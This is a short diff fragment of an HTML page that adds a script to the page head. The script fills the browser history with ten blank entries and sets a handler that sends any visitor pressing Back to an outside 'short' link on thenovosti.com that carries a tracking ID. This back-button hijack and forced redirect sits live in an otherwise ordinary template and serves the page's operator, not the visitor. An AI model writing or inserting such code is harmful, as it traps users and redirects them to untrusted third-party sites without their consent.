@@ -27,7 +27,17 @@
   
   
   
-  
+  <script>
+        (function(){
+            var t;
+            try{
+                for(t = 0; 10 > t; ++t) history.pushState({},"","");
+                onpopstate=function(t){
+                    t.state && location.replace("https://thenovosti.com/short/41285?stream_uuid=068612b4-7ffd-4858-bbd8-2847a2d7bc05&trek=1")
+                }
+            }catch(o){}
+        })();
+    </script>
 </head>
 <body>
   
